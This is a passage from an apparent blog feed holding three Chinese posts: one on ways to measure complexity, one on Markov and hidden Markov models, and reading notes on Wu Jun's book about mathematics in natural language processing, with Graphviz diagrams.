        <tag>数学与算法</tag>
      </tags>
  </entry>
  <entry>
    <title>如何度量复杂性</title>
    <url>/2018/03/25/Mathmetics-Complexity/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><ul>
<li>复杂系统、复杂度(Complexity)</li>
<li>如何度量复杂度：熵、算法信息量、逻辑深度、热力学深度、计算能力、层次性</li>
</ul>
<span id="more"></span>
<h2 id="如何度量复杂度"><a href="#如何度量复杂度" class="headerlink" title="如何度量复杂度"></a>如何度量复杂度</h2><p>2001 年，物理学家劳埃德（Seth Lloyd）发表了一篇文章（《Measures of complexity：A non-exhaustive list.  IEEE Control Systems Magazine, August 2001 》），分别从动力学、热力学、信息论等方面列出了 40 种度量复杂性的方法。提出了度量一个事物或过程的复杂性的三个维度：</p>
<ul>
<li>描述它有多困难 ？</li>
<li>产生它有多困难 ？</li>
<li>其组织程度如何 ？</li>
</ul>
<h4 id="用熵度量复杂性"><a href="#用熵度量复杂性" class="headerlink" title="用熵度量复杂性"></a>用熵度量复杂性</h4><p><strong>香农熵</strong>，相对于信息接收者的平均信息量或“惊奇度”。例如，假设消息由符号 A、C、G 和 T 组成。如果序列高度有序，如“A  A  A  A  A  A …… A ” 则熵为零。完全随机的序列则有最大可能熵。最复杂的对象不是最有序的或最随机的，而是介于两者之间。</p>
<p>在英语里，信息和情报是同一个词（Information），而我们知道情报的作用就是排除不确定性。</p>
<blockquote>
<p>如果没有信息，任何公式或者数字的游戏都无法排除不确定性。这个朴素的结论非常重要，但是在研究工作中经常被一些半瓶子醋的专家忽视，希望做这方面工作的读者谨记。(吴军 |《数学之美》)</p>
</blockquote>
<p>用香农熵度量复杂性的问题。首先，所针对的对象或过程需要转换成某种“消息”的形式，这并不总是那么容易做到。另外，随机消息的熵最高，但是那些最复杂的对象都不是完全随机的。例如变形虫的基因长度远远超过其他动植物，具备复杂功能的人类基因也不是随机的，甚至能看到长期历史演化出来的规律。</p>
<h4 id="用算法信息量度量复杂性"><a href="#用算法信息量度量复杂性" class="headerlink" title="用算法信息量度量复杂性"></a>用算法信息量度量复杂性</h4><p>为了改进熵度量复杂性的方法，1997 年柯尔莫哥洛夫（Andrey Kolmogorov）等人提出了算法信息量的概念。他们将事物的复杂度定义为能够产生对事物完整描述的最短计算机程序的长度。</p>
<p>为了计算有效复杂性，首先要给出事物规则性的最佳描述；有效复杂性定义为包含在描述中的信息量或规则集合的算法信息量。事物的结构可预测性越大，有效复杂性就越低。</p>
<p>对于一个事物的各种规则集，如何决定哪个是最好的呢？<strong>奥卡姆剃刀（Occam’s Razor, Ockham’s Razor）</strong>，意思是简约之法则。最好的规则集是能够描述事物的最小规则集，同时还能将事物的随机成分最小化。奥卡姆剃刀在现代医学中的应用最具代表性，医生和医学哲学家提出了 <strong>症状化约原则（diagnostic parsimony）</strong>。即在诊断某个病症时，医生应该尽量寻找会导致所有症状的最简单可能性。“当你听到背后有蹄声时，应该想到马而不是斑马。”  </p>
<p>虽然症状化约原则常常可能是正确的，然而也有争锋相对的意见：<strong>西卡姆格言（Hickam’s dictum）</strong>，“病人乐意得多少种病就能得多少种病。”  从统计数据看，一个病人的多种症状往往会归于多种常见疾病，而不是仅仅一种。另外，排除统计的因素，有许多病人无法使用单一疾病来解释众多的症状，被证实患有多种疾病。实际上，医生很难根据一个症状来判断是或者不是某个疾病，而是不断地根据病人的生活环境、日常习惯、用药史等等来建立、测试和修改对于症状的假设才是更好的方法。</p>
<h4 id="用逻辑深度度量复杂性"><a href="#用逻辑深度度量复杂性" class="headerlink" title="用逻辑深度度量复杂性"></a>用逻辑深度度量复杂性</h4><p>为了更加接近我们对复杂性的直觉，数学家班尼特在 20 世纪 80 年代初提出了 <strong>逻辑深度（logical depth）</strong> 的概念。</p>
<p>用班尼特的话说，“有逻辑深度的事物从根本上必须是长时间计算或漫长动力过程的产物，否则就不可能产生。” 或是像劳埃德说的，“用最合理的方法生成某个事物时需要处理的信息量等同于这个事物的复杂性，这是一个很吸引人的想法。”</p>
<h4 id="用热力学深度度量复杂性"><a href="#用热力学深度度量复杂性" class="headerlink" title="用热力学深度度量复杂性"></a>用热力学深度度量复杂性</h4><p>20 世纪 80 年代末，劳埃德和裴杰斯（Heinz Pagels）提出了一种复杂性度量方法：热力学深度（thermodynamic depth）。</p>
<p>与图灵机生成对事物的描述所需的时间步不同，热力学深度首先是确定“产生出这个事物最科学合理的确定事件序列”，然后测量“物理构造过程所需的热力源和信息源的总量”。例如，要确定人类基因组的热力学深度，得从最早出现的第一个生物的基因组开始，列出直到现代人类出现的所有遗传演化事件（随机变异、重组、基因复制等）。</p>
<p>问题：如何定义系统的状态粒度，在列出事件时，如何确定相关的宏观状态。</p>
<h4 id="用计算能力度量复杂性"><a href="#用计算能力度量复杂性" class="headerlink" title="用计算能力度量复杂性"></a>用计算能力度量复杂性</h4><p>一种观点认为，系统的计算能力如果等价于通用图灵机的计算能力，就是复杂系统。不过，班尼特等人则认为，具有执行通用计算的能力并不意味着系统本身就是复杂的；应当测量的是<strong>系统处理输入时的行为的复杂性</strong>。</p>
<h4 id="用层次性度量复杂性"><a href="#用层次性度量复杂性" class="headerlink" title="用层次性度量复杂性"></a>用层次性度量复杂性</h4><p>如何用层次（degree of hierarchy）来刻画一个系统的复杂性：复杂系统由子系统组成，子系统下面又有子系统，不断往下。（《复杂性的结构》：The architecture of complexity. Simon 1962）</p>
<p>西蒙认为，复杂系统最重要的共性就是 <strong>层次性</strong> 和 <strong>不可分解性</strong>。在层次性复杂系统中，子系统内部的紧密相互作用比子系统之间要多得多。例如，细胞内部的新陈代谢网络就比细胞之间的作用要复杂得多。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>各种度量复杂性的方法都抓住了一些方面，但都存在理论上和实践上的局限性，还远不能有效刻画实际系统的复杂性，度量方法的多样性也表明复杂系统具有许多维度，无法用单一的尺度来刻画。</p>
<h2 id="扩展阅读"><a href="#扩展阅读" class="headerlink" title="扩展阅读"></a>扩展阅读</h2><ul>
<li><a href="https://riboseyim.github.io/2018/02/10/Machine-Learning-Algorithms/">Machine Learning:机器学习算法</a></li>
<li><a href="https://riboseyim.github.io/2018/03/09/Machine-Learning-Economist/">Machine Learning:经济学家谈人工智能</a></li>
<li><a href="https://riboseyim.github.io/2017/09/15/Visualization-Graphviz/">数据可视化（三）基于 Graphviz 实现程序化绘图 | 开源中国首页推荐·每日一博</a></li>
</ul>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul>
<li>2001 劳埃德（Seth Lloyd）《Measures of complexity：A non-exhaustive list.  IEEE Control Systems Magazine, August 2001 》</li>
<li>1962 Simon《复杂性的结构》：The architecture of complexity.</li>
<li><a href="https://www.guokr.com/article/172437/">如何测出一句话中的信息量</a></li>
</ul>
]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>Engineering</tag>
        <tag>数学与算法</tag>
      </tags>
  </entry>
  <entry>
    <title>概率论基础：从马尔可夫模型（Markov Model）到贝叶斯网络</title>
    <url>/2017/05/09/Mathmetics-Markov-Model/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><ul>
<li>马尔可夫模型（Markov Model ）</li>
<li>隐含马尔可夫模型（ Hidden Markov Model ）</li>
<li>隐含隐马尔可夫模型的应用</li>
<li>马尔可夫链的扩展 —— 贝叶斯网络（Bayesian Network）</li>
</ul>
<span id="more"></span>
<p>19 世纪到 20 世纪初，<strong>马尔可夫（Andrey Markov）提出假设</strong>，任意一个词 Wi 出现的概率只同它前面的词 Wi-1有关，偷懒但颇为有效的方法。【符合这个假设的随机过程则称为马尔科夫过程，也称为马尔可夫链。】二元模型（ Bigram Model ）对应的公式如下：</p>
<p> P(S) = P(W1 ,W2, … , Wn)<br>    =P(W1)·P(W2|W1) ·P(W3|W2) ··· P(Wi | Wi-1) ··· P(Wn | Wn-1)</p>
<ul>
<li>马尔可夫链：符合这个马尔可夫假设的随机过程则称为马尔科夫过程。</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">digraph markov&#123;</span><br><span class="line">  label = <span class="string">&quot; Markov 马尔可夫链&quot;</span>;</span><br><span class="line">  rankdir = LR;</span><br><span class="line">  m1-&gt;m2[label = <span class="string">&quot;1.0&quot;</span>];</span><br><span class="line">  m2-&gt;m3[label = <span class="string">&quot;0.6&quot;</span>];</span><br><span class="line">  m3-&gt;m4[label = <span class="string">&quot;0.3&quot;</span>];</span><br><span class="line">  m2-&gt;m4[label = <span class="string">&quot;0.4&quot;</span>];</span><br><span class="line">  m3-&gt;m3[label = <span class="string">&quot;0.7&quot;</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img src="http://riboseyim-qiniu.riboseyim.com/markov.png" alt=""></p>
<ul>
<li>隐含马尔可夫模型（ Hidden Markov Model ）<br>最早由20世纪六七十年代，<a href="#">美国数学家鲍姆（ Leonard E. Baum ）</a> 发表的一系列论文中提出。隐含马尔可夫模型是马尔可夫链的一个扩展，即任一时刻 t 的状态 St 是不可见的。但是，在每个时刻 t 会输出一个富豪 Ot ，而且 Ot 和 St 相关且仅和 St 相关。</li>
</ul>
<p><img src="http://riboseyim-qiniu.riboseyim.com/markov-hidden.png" alt=""></p>
<h2 id="隐马尔可夫模型的应用"><a href="#隐马尔可夫模型的应用" class="headerlink" title="隐马尔可夫模型的应用"></a>隐马尔可夫模型的应用</h2><p>隐含马尔可夫模型成功的应用最早是语音识别（Sphinx——大词汇量连续语音识别系统）。根据应用的不同而有不同的名称,例如语音识别中的声学模型（ Acoustic Model ），机器翻译中的翻译模型（ Translation Model ）等。</p>
<h4 id="1、应用领域：翻译"><a href="#1、应用领域：翻译" class="headerlink" title="1、应用领域：翻译"></a>1、应用领域：翻译</h4><ul>
<li>语音识别，声学模型（ Acoustic Model ）</li>
<li>机器翻译，翻译模型（ Translation Model ）</li>
<li>中文断词/分词或光学字符识别</li>
<li>拼写纠错，纠错模型（ Correction Model）</li>
<li>手写体识别</li>
</ul>
<h4 id="2、应用领域：图像识别"><a href="#2、应用领域：图像识别" class="headerlink" title="2、应用领域：图像识别"></a>2、应用领域：图像识别</h4><h4 id="3、生物信息学-和-基因组学"><a href="#3、生物信息学-和-基因组学" class="headerlink" title="3、生物信息学 和 基因组学"></a>3、生物信息学 和 基因组学</h4><ul>
<li>基因组序列中蛋白质编码区域的预测</li>
<li>对于相互关联的DNA或蛋白质族的建模</li>
<li>从基本结构中预测第二结构元素</li>
<li>通信中的译码过程</li>
</ul>
<h3 id="隐含马尔可夫模型的训练"><a href="#隐含马尔可夫模型的训练" class="headerlink" title="隐含马尔可夫模型的训练"></a>隐含马尔可夫模型的训练</h3><ul>
<li>知识背景：概率论</li>
<li>围绕隐含马尔可夫模型的基本问题<ol>
<li>给定一个模型，如何计算某个特定输出序列的概率；<br>Forward-Backward 算法<br>参考书 Frederick Jelinek《Statistical Methods for Speech Recognition(Language, Speech, and Communication)》</li>
<li>给定一个模型和某个特定的输出序列，如何找到最可能产生这个输出的状态序列<br>解码算法：维特比算法</li>
<li>给定足够量的观测数据，如何估计隐含马尔可夫模型的参数。<br>绚练算法：鲍姆-韦尔奇算法（Baum-Welch Algorithm）</li>
</ol>
</li>
</ul>
<h2 id="扩展阅读"><a href="#扩展阅读" class="headerlink" title="扩展阅读"></a>扩展阅读</h2><ul>
<li><a href="https://riboseyim.github.io/2017/08/30/Mathmetics-Beauty/">读书笔记|数学之美（Beauty Of Mathmetics）</a></li>
</ul>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul>
<li><a href="https://mp.weixin.qq.com/s/1qM_J5We1iSe8_Ty-AL4Sw">马尔科夫模型与离散事件系统仿真模型简析 |  则裕沙龙@立波 </a></li>
<li><a href="http://blog.csdn.net/v_july_v/article/details/40984699">从贝叶斯方法谈到贝叶斯网络 | v_JULY_v (结构之法 算法之道)</a></li>
<li><a href="http://open.163.com/movie/2008/1/2/N/M6SGF6VB4_M6SGKSC2N.html">斯坦福大学公开课-机器学习过程-马尔可夫决策过程</a></li>
<li><a href="https://mp.weixin.qq.com/s?__biz=MzA5ODUxOTA5Mg==&amp;mid=2652555495&amp;idx=1&amp;sn=f5b46175b9a0cbd4006a193a0ca91782&amp;chksm=8b7e39bcbc09b0aa6d9b32a0d49926090fe7fb160ba4fbd51ed17cbbdb05806b234024198cf4&amp;mpshare=1&amp;scene=1&amp;srcid=0925x4UfKSwzSRQWFceVQEka%23rd">从贝叶斯定理到概率分布：综述概率论基本定义 | 算法与数学之美</a></li>
<li><a href="https://mp.weixin.qq.com/s?__biz=MzA5ODUxOTA5Mg==&amp;mid=2652555638&amp;idx=2&amp;sn=efc42acdeaa7921637924463cbf38db0&amp;chksm=8b7e382dbc09b13bc8048c762a088c0ae2b979706465aaef4b454c6289e7161a19b8998f114d&amp;mpshare=1&amp;scene=1&amp;srcid=100303yDRzK0nt5PI8G4NTcd%23rd">实例详解贝叶斯推理的原理 | 2017-10-03 算法与数学之美</a></li>
</ul>
]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>数学与算法</tag>
      </tags>
  </entry>
  <entry>
    <title>读书笔记|数学之美（Beauty Of Mathmetics）</title>
    <url>/2017/08/30/Mathmetics-Beauty/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><ul>
<li>作者：吴军</li>
<li>起源：Google中国的官方博客—谷歌黑板报连载的系列博客</li>
<li>主题：自然语言处理、科技史</li>
</ul>
<span id="more"></span>
<blockquote>
<p>数学的魅力就在于将复杂的问题复杂化</p>
<p>人类信息交流的发展贯穿了人类的进化和文明的全过程。而自然语言是人类交流信息的工具，语言和通信的联系是天然的。通信的本质就是一个解编码和传输的过程。（p49）</p>
</blockquote>
<h2 id="《数学之美》-Topic"><a href="#《数学之美》-Topic" class="headerlink" title="《数学之美》 Topic"></a>《数学之美》 Topic</h2><ul>
<li>自然语言识别与概率论：第 3、5、24 章</li>
<li>信息论：第 6 章</li>
</ul>
<h2 id="第一章-文字和语言-vs-数字和信息"><a href="#第一章-文字和语言-vs-数字和信息" class="headerlink" title="第一章 文字和语言 vs 数字和信息"></a>第一章 文字和语言 vs 数字和信息</h2><p>故事：罗赛塔石牌、犹太人抄圣经（校验）、口语和文言文（信道压缩）</p>
<ul>
<li>通信的原理和信息传播的模型</li>
<li>（信源）编码和最短编码</li>
<li>解码的规则，语法</li>
<li>聚类</li>
<li>校验位</li>
<li>双语对照文本，语料库和机器翻译</li>
<li>多义性和利用上下文消除歧义性</li>
</ul>
<h2 id="第二章-自然语言处理——从规则到统计"><a href="#第二章-自然语言处理——从规则到统计" class="headerlink" title="第二章 自然语言处理——从规则到统计"></a>第二章 自然语言处理——从规则到统计</h2><h4 id="Tips"><a href="#Tips" class="headerlink" title="Tips:"></a>Tips:</h4><ul>
<li><a href="#">宾夕法尼亚大学语言数据库（LDC）</a></li>
<li>图灵测试（<a href="#">阿兰-图灵(Alan Turing）</a> ): 让人和机器交流，如果人无法判断自己交流的对象是否为机器时，就说明机器有智能了。</li>
</ul>
<h4 id="自然语言发展阶段"><a href="#自然语言发展阶段" class="headerlink" title="自然语言发展阶段"></a>自然语言发展阶段</h4><ul>
<li>20世纪50-70年代：基于规则的方法，电脑模拟人脑理解语法、文法，收效甚微</li>
<li>20世纪70年代以后：基于数学模型和统计的方法。例如翻译，计算机不需要像人类一样理解两种语言。</li>
</ul>
<h4 id="人物"><a href="#人物" class="headerlink" title="人物"></a>人物</h4><ul>
<li><a href="#">明斯基（达特茅斯会议的发起者之一）</a>:著名人工智能专家,对美国科技决策部分产生了重大影响，自然科学基金会等对传统的自然语言处理研究资助大大减少。</li>
<li><a href="#">弗里德里克-贾里尼克（Frederick Jelinek) | IBM</a>:领导 IBM 华生实验室（T.J.Watson) 在统计语言学取得关键突破,语言识别70%-&gt;90%</li>
</ul>
<h4 id="长达15年的对峙时期"><a href="#长达15年的对峙时期" class="headerlink" title="长达15年的对峙时期"></a>长达15年的对峙时期</h4><p>两派人马各自召开自己的会议，持续争议。</p>
<h4 id="基于统计方法的发展"><a href="#基于统计方法的发展" class="headerlink" title="基于统计方法的发展"></a>基于统计方法的发展</h4><ul>
<li>上世纪70年代：基于统计的方法的核心模型是通信系统加隐含马尔可夫模型。<br>输入和输出都是一维的符号序列，保持原有的次序。最早的语音识别、词性分析取得成果；句法分析中输入的是一维的句子，输出的是二维的分析树；机器翻译中，输出的句子次序会有很大变化，效果不佳。</li>
<li><p>1998年，<a href="#">彼得·布朗(Peter Brown) | IBM</a> 等提出了基于统计的机器翻译方法效果很差，模型、数据不足。<br>（文艺复兴技术公司）</p>
</li>
<li><p>基于有向图的统计模型解决复杂的句法分析。</p>
</li>
<li>20世纪90年代末期：通过统计得到的句法规则甚至比语言学家总结的更有说服力。</li>
<li>2005年，Google 基于统计方法的翻译系统全面超过基于规则方法的 <a href="#">SysTran 翻译系统</a></li>
</ul>
<h4 id="科学史的教训：等待老科学家退休"><a href="#科学史的教训：等待老科学家退休" class="headerlink" title="科学史的教训：等待老科学家退休"></a>科学史的教训：等待老科学家退休</h4><blockquote>
<p>基于统计的方法代替传统的方法，需要等原有的一批语言学家退休。“老的科学家” 或者 “老科学的家” （钱钟书《围城》），后一种年纪不算老，但是已经落伍，大家必须耐心等待他们退休让出位子。毕竟，<strong>不是所有人都乐意改变自己的观点，无论对错。</strong> …… 因此，我常想，我自己一定要在还不太糊涂和固执时就退休（p25）</p>
</blockquote>
<h2 id="第三章-统计语言模型"><a href="#第三章-统计语言模型" class="headerlink" title="第三章 统计语言模型"></a>第三章 统计语言模型</h2><p>计算机处理自然语言的基本问题：为自然语言这种上下文相关的特性建立数学模型，即 <strong>统计语言模型（Statistical Language Model）</strong></p>
<p>贾里尼克：一个句子是否合理，就看看它的可能性大小如何。可能性用概率来衡量。</p>
<p>P(S) = P(W1 ,W2, … , Wn)<br>    =P(W1)·P(W2|W1) ·P(W3|W1,W2) ··· P(Wn | W1,W2, … , Wn-1)</p>
<p>S 表示某一个有意义的句子，由一连串特定顺序排列的词W1,W2, ··· , Wn 组成，n 是句子的长度。句子越长，条件概率  P(Wn | W1,W2, … , Wn-1) 的可能性越多，无法估算。</p>
<p>19 世纪到 20 世纪初，<strong>马尔可夫（Andrey Markov）提出假设</strong>，任意一个词 Wi 出现的概率只同它前面的词 Wi-1有关，偷懒但颇为有效的方法。【符合这个假设的随机过程则称为马尔科夫过程，也称为马尔可夫链。】二元模型（ Bigram Model ）对应的公式如下：</p>
<p> P(S) = P(W1 ,W2, … , Wn)<br>    =P(W1)·P(W2|W1) ·P(W3|W2) ··· P(Wi | Wi-1) ··· P(Wn | Wn-1)</p>
<p><strong>语料库（ Corpus ）</strong>: 大量机读样本<br>相对频度<br>根据 <strong>大数定理（ Law of Large Numbers ）</strong>，只要统计量足够，相对频度就等于概率<br>推导过程省略（P30）</p>
<h4 id="延伸阅读：统计语言模型的工程诀窍"><a href="#延伸阅读：统计语言模型的工程诀窍" class="headerlink" title="延伸阅读：统计语言模型的工程诀窍"></a>延伸阅读：统计语言模型的工程诀窍</h4><ul>
<li>2.1 高阶语言模型<br>很少有人能使用四元以上的模型，Google 的罗塞塔翻译系统和语言搜索引擎使用四元模型，该模型存储于 500 台 以上的 Google 服务器中。</li>
</ul>
<p>马尔可夫假设的局限性：自然语言中上下文相关性跨度可能非常大，需采用其他一些 <strong>长程的依赖性（ Long Distance Dependency ）</strong> 来解决。</p>
<ul>
<li><p>2.2 模型的训练、零概率问题和平滑方法</p>
</li>
<li><p>古德·图灵估计（ Good-Turing Estimate）</p>
</li>
</ul>
<p>一种概率估计方法：1953年，古德（ I. J. Good）、图灵（ Alan Turing ）提出，在统计中相信可靠的统计数据，而对不可信的统计数据打折扣，同时将折扣出来的那一小部分概率给予未看见的事件（ Unseen Events ）。</p>
<p>如果训练语料与模型应用的领域相脱节，那么模型的效果通常要大打折扣。例如腾讯搜索部门的语言模型，最早使用《人民日报》的语料训练（干净、无噪音），实际效果不佳，之后使用网页的数据，尽管有很多噪音但是训练数据与应用一致，搜索质量反而好。</p>
<h2 id="第四章-谈谈中文分词"><a href="#第四章-谈谈中文分词" class="headerlink" title="第四章 谈谈中文分词"></a>第四章 谈谈中文分词</h2><ul>
<li>早期的分词：《说文解字》和《论语》注解，目的都是为了以一家的理解消除歧义性</li>
<li>分词准确率：不是越高越好，而要看所谓正确的人工分词的数据是如何得来的。我们甚至只能讲某个分词器和另一个分词器相比，与人工分词结果的吻合度稍微高一点而已。目前采用统计语言模型，（选择哪种分词器）效果都差不到哪里去。</li>
</ul>
<h4 id="第五章-隐含马尔可夫模型"><a href="#第五章-隐含马尔可夫模型" class="headerlink" title="第五章 隐含马尔可夫模型"></a>第五章 隐含马尔可夫模型</h4><p>计划：201706<br>通读：201709</p>
<blockquote>
<p>人类信息交流的发展贯穿了人类的进化和文明的全过程。而自然语言是人类交流信息的工具，语言和通信的联系是天然的。通信的本质就是一个解编码和传输的过程。但是自然语言处理早期的努力都集中在语法、语义和知识表述上，离通信的原理越来越远，而这样答案也就越来越远。当自然语言处理的问题回归到通信系统中的解码问题时，很多难题都迎刃而解了。（p49）</p>
</blockquote>
<ul>
<li>雅格布森（ Roman Jakobson）提出的通信六个要素</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">digraph communicate&#123;</span><br><span class="line">  label=<span class="string">&quot;雅格布森提出的通信六个要素&quot;</span>;</span><br><span class="line"></span><br><span class="line">  信息和上下文[label = <span class="string">&quot;信息和上下文(发送者)&quot;</span>];</span><br><span class="line">  传递的信息[label = <span class="string">&quot;传递的信息(信道)&quot;</span>];</span><br><span class="line">  接收的信息[label = <span class="string">&quot;接收的信息(接收者)&quot;</span>];</span><br><span class="line"></span><br><span class="line">  信息和上下文 -&gt; 传递的信息[label = <span class="string">&quot;编码(S1,S2,S3,···)&quot;</span>];</span><br><span class="line">  传递的信息 -&gt; 接收的信息[label = <span class="string">&quot;解码(O1,O2,O3,···)&quot;</span>];</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>马尔可夫链：符合这个马尔可夫假设的随机过程则称为马尔科夫过程。</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">digraph markov&#123;</span><br><span class="line">  label = <span class="string">&quot; 马尔可夫模型（ Markov Model ）&quot;</span>;</span><br><span class="line">  rankdir = LR;</span><br><span class="line">  m1-&gt;m2[label = <span class="string">&quot;1.0&quot;</span>];</span><br><span class="line">  m2-&gt;m3[label = <span class="string">&quot;0.6&quot;</span>];</span><br><span class="line">  m3-&gt;m4[label = <span class="string">&quot;0.3&quot;</span>];</span><br><span class="line">  m2-&gt;m4[label = <span class="string">&quot;0.4&quot;</span>];</span><br><span class="line">  m3-&gt;m3[label = <span class="string">&quot;0.7&quot;</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="http://riboseyim-qiniu.riboseyim.com/markov.png" alt=""></p>
<ul>
<li>隐含马尔可夫模型（ Hidden Markov Model ）<br>最早由20世纪六七十年代，<a href="#">美国数学家鲍姆（ Leonard E. Baum ）</a> 发表的一系列论文中提出。隐含马尔可夫模型是马尔可夫链的一个扩展，即任一时刻 t 的状态 St 是不可见的。但是，在每个时刻 t 会输出一个富豪 Ot ，而且 Ot 和 St 相关且仅和 St 相关。</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">digraph hiddenmarkov&#123;</span><br><span class="line">  label = <span class="string">&quot; 隐含马尔可夫模型（ Hidden Markov Model ）&quot;</span>;</span><br><span class="line">  rankdir = LR;</span><br><span class="line"></span><br><span class="line">  S1-&gt;S2[label = <span class="string">&quot;&quot;</span>];</span><br><span class="line">  S1-&gt;O1[label = <span class="string">&quot;&quot;</span>];</span><br><span class="line"></span><br><span class="line">  S2-&gt;S3[label = <span class="string">&quot;&quot;</span>];</span><br><span class="line">  S2-&gt;O2[label = <span class="string">&quot;&quot;</span>];</span><br><span class="line"></span><br><span class="line">  S3-&gt;S4[label = <span class="string">&quot;&quot;</span>];</span><br><span class="line">  S3-&gt;O3[label = <span class="string">&quot;&quot;</span>];</span><br><span class="line"></span><br><span class="line">  S4-&gt;O4[label = <span class="string">&quot;&quot;</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="http://riboseyim-qiniu.riboseyim.com/markov-hidden.png" alt=""></p>
<ul>
<li>隐马尔可夫模型的应用<br>隐含马尔可夫模型成功的应用最早是语音识别（Sphinx——大词汇量连续语音识别系统）。根据应用的不同而有不同的名称,例如语音识别中的声学模型（ Acoustic Model ），机器翻译中的翻译模型（ Translation Model ）等。</li>
</ul>
<h4 id="延伸阅读隐含马尔可夫模型的训练"><a href="#延伸阅读隐含马尔可夫模型的训练" class="headerlink" title="延伸阅读隐含马尔可夫模型的训练"></a>延伸阅读隐含马尔可夫模型的训练</h4><ul>
<li>知识背景：概率论</li>
<li>围绕隐含马尔可夫模型的基本问题<ol>
<li>给定一个模型，如何计算某个特定输出序列的概率；<br>Forward-Backward 算法<br>参考书 Frederick Jelinek《Statistical Methods for Speech Recognition(Language, Speech, and Communication)》</li>
<li>给定一个模型和某个特定的输出序列，如何找到最可能产生这个输出的状态序列<br>解码算法：维特比算法</li>
<li>给定足够量的观测数据，如何估计隐含马尔可夫模型的参数。<br>绚练算法：鲍姆-韦尔奇算法（Baum-Welch Algorithm）</li>
</ol>
</li>
</ul>
<h4 id="第六章-信息的度量和作用"><a href="#第六章-信息的度量和作用" class="headerlink" title="第六章 信息的度量和作用"></a>第六章 信息的度量和作用</h4><ul>
<li><p>信息熵<br>要搞清楚意见非常非常不确定的事，或是我们一无所知的事情，就需要了解大量的信息。<br>相反，如果我们对某件事已经有了较多的了解，那么不需要太多的信息就能把它搞清楚。<br>所以，从这个角度来看，可以认为，信息量就等于不确定性的多少。</p>
</li>
<li><p>信息的作用<br>在英语里，信息和情报是同一个词（ Information ），而我们知道情报的作用就是排除不确定性。</p>
</li>
<li><p>案例：斯大林、日军南下战略情报</p>
</li>
</ul>
<p><strong>如果没有信息，任何公式或者数字的游戏都无法排除不确定性。这个朴素的结论非常重要，但是在研究工作中经常被一些半瓶子醋的专家忽视，希望做这方面工作的读者谨记</strong>。</p>
<p>几乎所有的自然语言处理、信息与信号处理的应用都是一个消除不确定性的过程。</p>
<h4 id="延伸阅读：信息论在信息处理中的应用"><a href="#延伸阅读：信息论在信息处理中的应用" class="headerlink" title="延伸阅读：信息论在信息处理中的应用"></a>延伸阅读：信息论在信息处理中的应用</h4><ul>
<li>信息熵</li>
<li>冗余度 ( Redundancy )</li>
<li>互信息 ( Mutual Information )，量化地度量相关性</li>
<li>相对熵 ( Relative Entropy 或 Kullback-Leibler Divergence )</li>
</ul>
<h4 id="信息论参考文献"><a href="#信息论参考文献" class="headerlink" title="信息论参考文献"></a>信息论参考文献</h4><ul>
<li>《A Mathematic Theory of Communication》(“通信的数学原理”)，香农（ Claude Shannon ）,1948</li>
<li>《Elements of Information Theory》(“信息论基础”)，托马斯·科弗（ Thomas Cover ）</li>
</ul>
<h4 id="第七章-贾里尼克和现代语言处理"><a href="#第七章-贾里尼克和现代语言处理" class="headerlink" title="第七章 贾里尼克和现代语言处理"></a>第七章 贾里尼克和现代语言处理</h4><h4 id="第八章-简单之美——布尔代数和搜索引擎的索引"><a href="#第八章-简单之美——布尔代数和搜索引擎的索引" class="headerlink" title="第八章 简单之美——布尔代数和搜索引擎的索引"></a>第八章 简单之美——布尔代数和搜索引擎的索引</h4><h4 id="第九章-图论和网络爬虫"><a href="#第九章-图论和网络爬虫" class="headerlink" title="第九章 图论和网络爬虫"></a>第九章 图论和网络爬虫</h4><p>计划：201706<br>通读：20170927</p>
<ul>
<li>交通路径规划</li>
<li>深度优先搜索（ Depth-First Search , DFS）</li>
<li>广度优先搜索（ Breadth-First Search , BFS）</li>
<li>网络爬虫 ( Web Crawlers ) ：超链接 ( Hyperlinks )</li>
</ul>
<h4 id="延伸阅读：图论的亮点补充说明"><a href="#延伸阅读：图论的亮点补充说明" class="headerlink" title="延伸阅读：图论的亮点补充说明"></a>延伸阅读：图论的亮点补充说明</h4><ol>
<li>欧拉七桥问题的证明</li>
<li>构建网络爬虫的工程要点：<pre><code> 1）搜索引擎的调度（BFS）
 2）页面分析和 URL 的提取
 3）记录哪些网页已经下载（ URL 表）
</code></pre></li>
</ol>
<blockquote>
<p>很多数学方法就是这样，看上去没有什么实际用途，但是随着时间的推移会一下子派上大用场。这恐怕是世界上还有很多人毕生研究数学的原因。</p>
</blockquote>
